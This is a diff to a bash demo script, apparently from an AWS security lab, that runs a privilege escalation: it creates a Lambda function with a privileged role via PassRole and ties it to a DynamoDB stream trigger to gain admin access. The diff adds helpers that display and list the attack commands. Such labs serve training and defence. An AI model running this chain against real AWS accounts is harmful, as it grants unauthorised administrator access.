@@ -4,7 +4,9 @@
 # This scenario demonstrates how a user with PassRole, CreateFunction, and CreateEventSourceMapping can escalate
 # privileges by creating a Lambda function with a privileged role and linking it to a DynamoDB stream trigger
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -12,6 +14,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-lambda-002-to-admin-starting-user"
@@ -80,6 +100,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -91,6 +112,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -98,6 +120,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -109,6 +132,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Getting DynamoDB stream ARN${NC}"
 echo "Describing DynamoDB table: $DYNAMODB_TABLE"
 
+show_cmd "aws dynamodb describe-table --region $AWS_REGION --table-name $DYNAMODB_TABLE --query 'Table.LatestStreamArn' --output text"
 DYNAMODB_STREAM_ARN=$(aws dynamodb describe-table \
     --region $AWS_REGION \
     --table-name $DYNAMODB_TABLE \
@@ -180,6 +204,7 @@ echo "This is the privilege escalation vector - passing the admin role to Lambda
 TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
 echo "Target Role ARN: $TARGET_ROLE_ARN"
 
+show_attack_cmd "aws lambda create-function --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --runtime \"python3.11\" --role \"$TARGET_ROLE_ARN\" --handler \"lambda_function.lambda_handler\" --zip-file \"fileb:///tmp/lambda_function.zip\" --timeout 30 --environment \"Variables={TARGET_USER=$STARTING_USER}\" --output json"
 LAMBDA_RESULT=$(aws lambda create-function \
     --region $AWS_REGION \
     --function-name "$LAMBDA_FUNCTION_NAME" \
@@ -214,6 +239,7 @@ echo "Linking Lambda function to DynamoDB stream trigger..."
 echo "Function: $LAMBDA_FUNCTION_NAME"
 echo "Stream: $DYNAMODB_STREAM_ARN"
 
+show_attack_cmd "aws lambda create-event-source-mapping --region $AWS_REGION --function-name \"$LAMBDA_FUNCTION_NAME\" --event-source-arn \"$DYNAMODB_STREAM_ARN\" --starting-position LATEST --output json"
 EVENT_SOURCE_MAPPING=$(aws lambda create-event-source-mapping \
     --region $AWS_REGION \
     --function-name "$LAMBDA_FUNCTION_NAME" \
@@ -364,6 +390,7 @@ export AWS_REGION="$AWS_REGION"
 unset AWS_SESSION_TOKEN
 
 echo "Attempting to list IAM users..."
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -395,6 +422,13 @@ echo -e "  $STARTING_USER → (PassRole + CreateFunction) → $LAMBDA_FUNCTION_N
 echo -e "  → (CreateEventSourceMapping) → DynamoDB stream trigger"
 echo -e "  → Lambda executes with $TARGET_ROLE → (AttachUserPolicy) → Admin access"
 
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Lambda Function: $LAMBDA_FUNCTION_NAME"
 echo "- Function Role: $TARGET_ROLE"
@@ -409,3 +443,6 @@ echo ""
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
